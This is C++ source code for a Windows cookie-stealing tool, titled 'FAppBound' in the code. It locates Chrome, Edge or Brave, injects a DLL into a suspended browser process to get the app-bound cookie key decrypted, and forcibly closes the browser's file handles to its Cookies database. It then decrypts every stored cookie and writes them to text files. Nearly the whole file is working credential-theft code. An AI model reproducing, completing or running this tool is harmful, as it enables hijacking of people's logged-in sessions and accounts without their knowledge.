#include <windows.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <cstdint>
#include <cstdio>
#include <string>
#include <vector>
#include <fstream>
#include <regex>
#include <filesystem>
#include "sqlite3.h"

#pragma comment(lib, "bcrypt.lib")

static void Pause() { (void)getchar(); }

namespace fs = std::filesystem;

static const uint8_t V20_PREFIX[] = {'v', '2', '0'};
static const size_t GCM_IV_LENGTH = 12;
static const size_t GCM_TAG_LENGTH = 16;
static const size_t COOKIE_HEADER_SIZE = 32;

static uint32_t rotl32(uint32_t x, int r) {
    return (x << r) | (x >> (32 - r));
}

std::string PidToTag(DWORD pid) {
    uint32_t c1 = 0xA5A5A5A5u;
    uint32_t c2 = 0x3C6EF372u;
    uint32_t c3 = 0x1BF5A7E1u;
    uint32_t c4 = 0x9E3779B9u;
    uint32_t w1 = rotl32(pid ^ c1, 5);
    uint32_t w2 = rotl32(pid ^ c2, 11);
    uint32_t w3 = rotl32(pid ^ c3, 17);
    uint32_t w4 = rotl32(pid ^ c4, 23);
    char buf[33];
    snprintf(buf, sizeof(buf), "%08X%08X%08X%08X", w1, w2, w3, w4);
    return std::string(buf);
}

std::vector<DWORD> FindAllProcessIds(const char* name) {
    std::vector<DWORD> pids;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return pids;
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    wchar_t wname[260];
    MultiByteToWideChar(CP_ACP, 0, name, -1, wname, 260);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, wname) == 0)
                pids.push_back(pe.th32ProcessID);
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pids;
}

typedef NTSTATUS (NTAPI *pNtQSI)(ULONG, PVOID, ULONG, PULONG);
struct SysHandleInfo { ULONG count; ULONG pad; };
struct HandleEntry { ULONG ProcessId; UCHAR ObjectTypeIndex; UCHAR HandleAttributes; USHORT HandleValue; PVOID ObjectPointer; ULONG GrantedAccess; };

void CloseTargetHandles(const std::vector<DWORD>& pids) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    auto NtQSI = (pNtQSI)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (!NtQSI) return;
    ULONG size = 0x10000; PVOID buf = nullptr; NTSTATUS st;
    do { size *= 2; free(buf); buf = malloc(size); st = NtQSI(16, buf, size, &size); }
    while (st == (NTSTATUS)0xC0000004);
    if (st < 0) { free(buf); return; }
    auto header = (SysHandleInfo*)buf;
    if (!header) { free(buf); return; }
    auto entries = (HandleEntry*)((ULONG_PTR)buf + sizeof(SysHandleInfo));
    int closed = 0;
    for (ULONG i = 0; i < header->count; i++) {
        bool isTarget = false;
        for (DWORD pid : pids) { if (entries[i].ProcessId == pid) { isTarget = true; break; } }
        if (!isTarget) continue;
        HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, entries[i].ProcessId);
        if (!hProc) continue;
        HANDLE hDup = nullptr;
        if (!DuplicateHandle(hProc, (HANDLE)(ULONG_PTR)entries[i].HandleValue, GetCurrentProcess(), &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) { CloseHandle(hProc); continue; }
        if (GetFileType(hDup) != FILE_TYPE_DISK) { CloseHandle(hDup); CloseHandle(hProc); continue; }
        char nameBuf[MAX_PATH] = {};
        DWORD nameLen = GetFinalPathNameByHandleA(hDup, nameBuf, MAX_PATH, FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
        CloseHandle(hDup);
        if (nameLen > 0) {
            std::string path(nameBuf);
            for (auto& c : path) c = (char)tolower((unsigned char)c);
            if (path.find("cookies") != std::string::npos) {
                HANDLE hCloser = nullptr;
                DuplicateHandle(hProc, (HANDLE)(ULONG_PTR)entries[i].HandleValue, GetCurrentProcess(), &hCloser, 0, FALSE, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);
                if (hCloser) { CloseHandle(hCloser); closed++; }
            }
        }
        CloseHandle(hProc);
    }
    free(buf);
    printf("[*] Closed %d handle(s) to Cookies\n", closed);
}

std::string FindBrowser(const char* exeName) {
    HKEY hives[] = { HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER };
    const char* subpaths[] = { R"(SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\)", R"(SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\)" };
    for (auto hive : hives) {
        for (auto sub : subpaths) {
            std::string keyPath = std::string(sub) + exeName;
            HKEY hKey;
            if (RegOpenKeyExA(hive, keyPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                char path[MAX_PATH] = {};
                DWORD size = sizeof(path), type = REG_SZ;
                if (RegQueryValueExA(hKey, nullptr, nullptr, &type, (BYTE*)path, &size) == ERROR_SUCCESS) { RegCloseKey(hKey); return std::string(path); }
                RegCloseKey(hKey);
            }
        }
    }
    return "";
}

bool InjectDll(HANDLE hProcess, const char* dllPath) {
    size_t len = strlen(dllPath) + 1;
    void* remoteMem = VirtualAllocEx(hProcess, nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) return false;
    SIZE_T written = 0;
    WriteProcessMemory(hProcess, remoteMem, dllPath, len, &written);
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return false;
    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
    if (!pLoadLibrary) return false;
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pLoadLibrary), remoteMem, 0, nullptr);
    if (!hThread) return false;
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    return true;
}

std::string GetLocalStatePath(const char* browserName) {
    char* localAppData = nullptr; size_t len = 0;
    _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
    if (!localAppData) return "";
    std::string path = std::string(localAppData) + "\\" + browserName + "\\User Data\\Local State";
    free(localAppData);
    return path;
}

std::string GetUserDataPath(const char* browserName) {
    char* localAppData = nullptr; size_t len = 0;
    _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
    if (!localAppData) return "";
    std::string path = std::string(localAppData) + "\\" + browserName + "\\User Data";
    free(localAppData);
    return path;
}

static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
std::vector<uint8_t> Base64Decode(const std::string& input) {
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[(unsigned char)b64_table[i]] = i;
    std::vector<uint8_t> result;
    uint32_t val = 0; int bits = 0;
    for (unsigned char c : input) { if (T[c] == -1) continue; val = (val << 6) | T[c]; bits += 6; if (bits >= 8) { bits -= 8; result.push_back((uint8_t)(val >> bits)); } }
    return result;
}

std::vector<uint8_t> GetEncryptedKey(const std::string& localStatePath) {
    printf("[*] Reading: %s\n", localStatePath.c_str());
    std::ifstream file(localStatePath);
    if (!file.is_open()) { printf("[-] Cannot open Local State\n"); return {}; }
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    const char* needle = "\"app_bound_encrypted_key\"";
    size_t pos = content.find(needle);
    if (pos == std::string::npos) { printf("[-] Key not found\n"); return {}; }
    pos = content.find('"', pos + strlen(needle) + 1);
    if (pos == std::string::npos) return {};
    pos++;
    size_t end = content.find('"', pos);
    if (end == std::string::npos) return {};
    auto decoded = Base64Decode(content.substr(pos, end - pos));
    printf("[*] Encrypted key: %zu bytes\n", decoded.size());
    if (decoded.size() <= 4) return {};
    return std::vector<uint8_t>(decoded.begin() + 4, decoded.end());
}

bool SendEncryptedKey(HANDLE hPipe, const std::vector<uint8_t>& key) {
    uint32_t length = (uint32_t)key.size();
    DWORD written = 0;
    if (!WriteFile(hPipe, &length, sizeof(length), &written, nullptr)) return false;
    if (!WriteFile(hPipe, key.data(), length, &written, nullptr)) return false;
    return true;
}

std::string RecieveDecryptedKey(HANDLE hPipe) {
    char buf[1024] = {};
    DWORD bytesRead = 0;
    if (!ReadFile(hPipe, buf, sizeof(buf) - 1, &bytesRead, nullptr)) return "";
    return std::string(buf);
}

std::vector<uint8_t> HexToBytes(const std::string& hex) {
    std::vector<uint8_t> bytes;
    for (size_t i = 0; i + 1 < hex.size(); i += 2)
        bytes.push_back((uint8_t)strtol(hex.substr(i, 2).c_str(), nullptr, 16));
    return bytes;
}

std::vector<uint8_t> DecryptGCM(const std::vector<uint8_t>& key, const uint8_t* data, size_t dataLen) {
    if (dataLen < 3 + GCM_IV_LENGTH + GCM_TAG_LENGTH) return {};
    if (memcmp(data, V20_PREFIX, 3) != 0) return {};
    const uint8_t* iv = data + 3;
    const uint8_t* ciphertext = data + 3 + GCM_IV_LENGTH;
    size_t ciphertextLen = dataLen - 3 - GCM_IV_LENGTH - GCM_TAG_LENGTH;
    const uint8_t* tag = data + 3 + GCM_IV_LENGTH + ciphertextLen;
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) < 0) return {};
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) < 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return {}; }
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PBYTE)key.data(), (ULONG)key.size(), 0) < 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return {}; }
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO aeadInfo;
    memset(&aeadInfo, 0, sizeof(aeadInfo));
    aeadInfo.cbSize = sizeof(aeadInfo); aeadInfo.dwInfoVersion = 1;
    aeadInfo.pbNonce = (PBYTE)iv; aeadInfo.cbNonce = GCM_IV_LENGTH;
    aeadInfo.pbTag = (PBYTE)tag; aeadInfo.cbTag = GCM_TAG_LENGTH;
    std::vector<uint8_t> plaintext(ciphertextLen);
    ULONG outLen = 0;
    NTSTATUS status = BCryptEncrypt(hKey, (PBYTE)ciphertext, (ULONG)ciphertextLen, &aeadInfo, nullptr, 0, plaintext.data(), (ULONG)plaintext.size(), &outLen, 0);
    BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
    if (status < 0) return {};
    plaintext.resize(outLen);
    return plaintext;
}

std::vector<std::pair<std::string, std::string>> FindCookieFiles(const std::string& userDataPath) {
    std::vector<std::pair<std::string, std::string>> result;
    std::regex profileRegex(R"(^(Default|Profile \d+))", std::regex::icase);
    for (auto& entry : fs::directory_iterator(userDataPath)) {
        if (!entry.is_directory()) continue;
        std::string name = entry.path().filename().string();
        if (!std::regex_match(name, profileRegex)) continue;
        fs::path cookieFile = entry.path() / "Network" / "Cookies";
        if (fs::exists(cookieFile)) result.push_back({cookieFile.string(), name});
    }
    return result;
}

bool ReadFileToTemp(const std::string& cookieFile, const fs::path& tmpPath) {
    for (int attempt = 0; attempt < 3; attempt++) {
        HANDLE hSrc = CreateFileA(cookieFile.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hSrc != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hSrc, nullptr);
            if (fileSize != INVALID_FILE_SIZE) {
                std::vector<char> data(fileSize);
                DWORD read = 0;
                if (ReadFile(hSrc, data.data(), fileSize, &read, nullptr) && read == fileSize) {
                    HANDLE hDst = CreateFileA(tmpPath.string().c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                    if (hDst != INVALID_HANDLE_VALUE) {
                        DWORD written = 0;
                        WriteFile(hDst, data.data(), fileSize, &written, nullptr);
                        CloseHandle(hDst); CloseHandle(hSrc);
                        return true;
                    }
                }
            }
            CloseHandle(hSrc);
        }
        DWORD err = GetLastError();
        if (err == ERROR_SHARING_VIOLATION && attempt < 2) {
            printf("[*] Sharing violation, closing Chrome handles...\n");
            auto chromePids = FindAllProcessIds("chrome.exe");
            printf("[*] Found %zu Chrome process(es)\n", chromePids.size());
            CloseTargetHandles(chromePids);
            Sleep(500);
        } else {
            printf("[-] CreateFile failed: error %lu\n", err);
            return false;
        }
    }
    return false;
}

int DecryptCookies(const std::string& cookieFile, const std::vector<uint8_t>& aesKey, const std::string& profileName, const std::string& browserName) {
    printf("[*] Opening: %s\n", cookieFile.c_str());
    fs::path tmpPath = fs::temp_directory_path() / ("cookies_" + profileName + ".db");
    if (!ReadFileToTemp(cookieFile, tmpPath)) { printf("[-] Cannot read cookie file\n"); return 0; }

    sqlite3* db = nullptr;
    if (sqlite3_open_v2(tmpPath.string().c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        printf("[-] sqlite3_open failed: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db); fs::remove(tmpPath); return 0;
    }

    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, nullptr) != SQLITE_OK) {
        printf("[-] sqlite3_prepare failed: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db); fs::remove(tmpPath); return 0;
    }

    fs::path outDir = fs::current_path() / "cookies";
    fs::create_directories(outDir);
    fs::path outFile = outDir / (browserName + "_" + profileName + "_cookies.txt");
    std::ofstream out(outFile);
    int count = 0;

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const char* host = (const char*)sqlite3_column_text(stmt, 0);
        const char* name = (const char*)sqlite3_column_text(stmt, 1);
        const uint8_t* encValue = (const uint8_t*)sqlite3_column_blob(stmt, 2);
        int encLen = sqlite3_column_bytes(stmt, 2);
        if (!encValue || encLen <= 0) continue;
        auto plain = DecryptGCM(aesKey, encValue, encLen);
        if (plain.size() <= COOKIE_HEADER_SIZE) continue;
        std::string value(plain.begin() + COOKIE_HEADER_SIZE, plain.end());
        out << host << "\tTRUE\t/\tFALSE\t1893456000\t" << name << "\t" << value << "\n";
        count++;
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    fs::remove(tmpPath);

    if (count > 0) printf("[+] %s: %d cookies\n", profileName.c_str(), count);
    return count;
}

int main() {
    SetConsoleTitleA("FAppBound");

    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    std::string exeDir = std::string(exePath).substr(0, std::string(exePath).find_last_of('\\') + 1);
    std::string dllPath = exeDir + "fappbound.dll";

    const char* browsers[] = {"chrome.exe", "msedge.exe", "brave.exe"};
    std::string target;
    for (auto b : browsers) { target = FindBrowser(b); if (!target.empty()) break; }
    if (target.empty()) { printf("[-] No browser found\n"); Pause(); return 1; }

    std::string browserName;
    if (target.find("chrome.exe") != std::string::npos) browserName = "Google\\Chrome";
    else if (target.find("msedge.exe") != std::string::npos) browserName = "Microsoft\\Edge";
    else if (target.find("brave.exe") != std::string::npos) browserName = "BraveSoftware\\Brave-Browser";

    printf("[*] Target: %s\n", target.c_str());

    std::string localStatePath = GetLocalStatePath(browserName.c_str());
    auto encryptedKey = GetEncryptedKey(localStatePath);
    if (encryptedKey.empty()) { printf("[-] No encrypted key\n"); Pause(); return 1; }

    STARTUPINFOA si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessA(target.c_str(), nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        printf("[-] CreateProcess failed: %lu\n", GetLastError()); Pause(); return 1;
    }

    DWORD pid = pi.dwProcessId;
    std::string pipeName = R"(\\.\pipe\)" + PidToTag(pid);

    HANDLE hPipe = CreateNamedPipeA(pipeName.c_str(), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 65536, 65536, 0, nullptr);
    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe failed\n");
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        Pause(); return 1;
    }

    printf("[*] Injecting DLL...\n");
    if (!InjectDll(pi.hProcess, dllPath.c_str())) {
        printf("[-] InjectDll failed\n");
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hPipe);
        Pause(); return 1;
    }
    printf("[+] DLL injected, waiting...\n");

    if (!ConnectNamedPipe(hPipe, nullptr) && GetLastError() != ERROR_PIPE_CONNECTED) {
        Sleep(100);
        if (!ConnectNamedPipe(hPipe, nullptr) && GetLastError() != ERROR_PIPE_CONNECTED) {
            printf("[-] ConnectNamedPipe failed\n");
            TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hPipe);
            Pause(); return 1;
        }
    }

    if (!SendEncryptedKey(hPipe, encryptedKey)) {
        printf("[-] SendEncryptedKey failed\n");
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hPipe);
        Pause(); return 1;
    }

    std::string decryptedHex = RecieveDecryptedKey(hPipe);
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (decryptedHex.empty()) { printf("[-] DecryptData failed\n"); Pause(); return 1; }
    printf("[+] Key: %s\n", decryptedHex.c_str());

    auto aesKey = HexToBytes(decryptedHex);
    std::string userDataPath = GetUserDataPath(browserName.c_str());
    auto cookieFiles = FindCookieFiles(userDataPath);

    int totalCookies = 0;
    for (auto& [file, profile] : cookieFiles)
        totalCookies += DecryptCookies(file, aesKey, profile, browserName.substr(browserName.find_last_of('\\') + 1));

    printf("[+] Total: %d cookies\n", totalCookies);
    Pause();
    return 0;
}
